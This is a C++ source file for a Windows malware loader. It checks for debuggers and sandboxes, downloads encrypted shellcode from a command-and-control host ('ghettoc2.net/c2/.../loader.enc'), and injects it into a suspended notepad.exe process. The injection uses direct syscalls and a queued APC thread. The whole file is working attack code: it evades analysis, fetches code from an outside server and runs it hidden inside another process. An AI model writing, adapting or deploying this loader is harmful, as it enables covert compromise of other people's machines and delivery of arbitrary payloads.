#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#include "syscalls.h"

#pragma comment(lib, "winhttp.lib")

#define DEBUGGING 1

#define MAXSHELLCODESIZE 4096

#define _CRT_SECURE_NO_DEPRECATE
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

#pragma warning (disable : 4996)

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

BOOL timing_CreateWaitableTimer(UINT delayInMillis)
{
    HANDLE hTimer;
    LARGE_INTEGER dueTime;

    BOOL bResult = FALSE;

    dueTime.QuadPart = delayInMillis * -10000LL;

    hTimer = CreateWaitableTimer(NULL, TRUE, NULL);

    if (hTimer == NULL)
    {
        return TRUE;
    }

    if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
    {
        bResult = TRUE;
    }
    else {
        if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
        {
            bResult = TRUE;
        }
    }

    CancelWaitableTimer(hTimer);
    CloseHandle(hTimer);
    return bResult;
}

//sandbox check to check hardrive 
BOOL getsandbox_drive_size() {
    GET_LENGTH_INFORMATION size;
    DWORD lpBytesReturned;

    HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) {
        // Someone is playing tricks. Or not encoded_kwdikas enough privileges.
        CloseHandle(drive);
        return FALSE;
    }

    BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
    CloseHandle(drive);

    if (result != 0) {
        if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
            return FALSE;
    }

    return TRUE;
}

BOOL checkup()
{
    BOOL bIsDbgPresent = FALSE;
    
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);

    if (bIsDbgPresent) {
#ifdef DEBUGGING
        fprintf(stderr, "Remote debugger found, %d\n", bIsDbgPresent);
#endif
        return FALSE;
    }

    /*
    if (!getsandbox_drive_size()) {
#ifdef DEBUGGING
        fprintf(stderr, "Something dodgy with drive size\n");
#endif
        return FALSE;
    }
    */

    if (timing_CreateWaitableTimer(4000)) {
#ifdef DEBUGGING
        fprintf(stderr, "CreateWaitable Timer event\n");
#endif
        return FALSE;
    }

    return TRUE;

}

int main()
{
    if (!checkup()) {
        fprintf(stderr, "Bailing out\n");
        return 0;
    }

    NTSTATUS  ntstatus;
    LPVOID    start_address = NULL;
    SIZE_T    code_size;
    DWORD     oldProtect = NULL;

#ifdef DEBUGGING
    printf("Starting download\n");
#endif
    std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
#ifdef DEBUGGING
    printf("Finished download\n");
#endif

    unsigned int shellcode_size = (unsigned int)shellcode.size();
#ifdef DEBUGGING
	printf("Shellcode size is %d\n", shellcode_size);
#endif
	if (shellcode_size > MAXSHELLCODESIZE) {
		fprintf(stderr, "Shellcode is too big (%d), maximum size is %d\n", shellcode_size, MAXSHELLCODESIZE);
		return 0;
	}

    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    // Allocate Virtual Memory
    code_size = (SIZE_T)shellcode_size;
    ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ntstatus)) {
#ifdef DEBUGGING
        fprintf(stderr, "NtAllocVirtualMemory error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#ifdef DEBUGGING
        fprintf(stderr, "Virtual Memory allocated at %llx, allocated size %d\n", (unsigned __int64)start_address, (unsigned int)code_size);
#endif
    }

	unsigned char buf[MAXSHELLCODESIZE];
	memcpy(buf, &shellcode[0], shellcode_size);

    // do_xor(encoded_kwdikas, sizeof(encoded_kwdikas), key, sizeof(key));
    // Copy shellcode into allocated memory
    ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
    if (!NT_SUCCESS(ntstatus)) {
#ifdef DEBUGGING
        fprintf(stderr, "NtWriteVirtualMemory error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#ifdef DEBUGGING
        fprintf(stderr, "Memory Written\n");
#endif
    }

    ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&code_size, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(ntstatus)) {
#ifdef DEBUGGING
        fprintf(stderr, "NtProtectVirtualMemory error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#ifdef DEBUGGING
        fprintf(stderr, "Memory Protected\n");
#endif
    }

    ntstatus = NtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
    if (!NT_SUCCESS(ntstatus)) {
#ifdef DEBUGGING
        fprintf(stderr, "NtQueueApcThread error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#ifdef DEBUGGING
        fprintf(stderr, "APC thread queued\n");
#endif
    }

    ntstatus = NtResumeThread(process_info->hThread, NULL);
    if (!NT_SUCCESS(ntstatus)) {
#ifdef DEBUGGING
        fprintf(stderr, "NtResumeThread error, ntstatus is %d\n", ntstatus);
#endif
        return 0;
    }
    else {
#ifdef DEBUGGING
        fprintf(stderr, "Thread resumed\n");
#endif
    }

    // close handles
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
#ifdef DEBUGGING
    getchar();
#endif
    return 1;

}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0); // no ssl
//        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

        // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        443,            // port 8000
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
//        0); // no ssl
        WINHTTP_FLAG_SECURE);                   // ssl

        // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}